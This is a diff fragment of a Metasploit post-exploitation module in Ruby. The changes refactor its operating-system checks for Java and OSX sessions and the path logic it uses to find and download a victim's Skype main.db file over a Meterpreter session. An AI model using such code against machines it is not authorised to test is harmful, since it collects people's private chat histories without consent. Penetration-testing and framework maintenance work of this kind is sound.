@@ -7,18 +7,11 @@ require 'msf/core'
 require 'rex'
 require 'csv'
 
-
-
-
-
 class MetasploitModule < Msf::Post
 
   include Msf::Post::File
   include Msf::Post::Windows::UserProfiles
-
   include Msf::Post::OSX::System
-
-
 
   def initialize(info={})
     super( update_info( info,
@@ -52,9 +45,9 @@ class MetasploitModule < Msf::Post
       return
     end
 
-      if (session.platform =~ /java/) || (session.platform =~ /osx/)
-        # Make sure a Java Meterpreter on anything but OSX will exit
-        if session.platform =~ /java/ and sysinfo['OS'] !~ /Mac OS X/
+      if session.platform =~ /java/
+        # Make sure that Java Meterpreter on anything but OSX will exit
+        if session.platform !~ /osx/
           print_error("This session type and platform are not supported.")
           return
         end
@@ -105,7 +98,7 @@ class MetasploitModule < Msf::Post
   # Download file using Meterpreter functionality and returns path in loot for the file
   def download_db(profile)
     if session.type =~ /meterpreter/
-      if sysinfo['OS'] =~ /Mac OS X/
+      if session.platform =~ /osx/
         file = session.fs.file.search("#{profile['dir']}/Library/Application Support/Skype/","main.db",true)
       else
         file = session.fs.file.search("#{profile['AppData']}\\Skype","main.db",true)
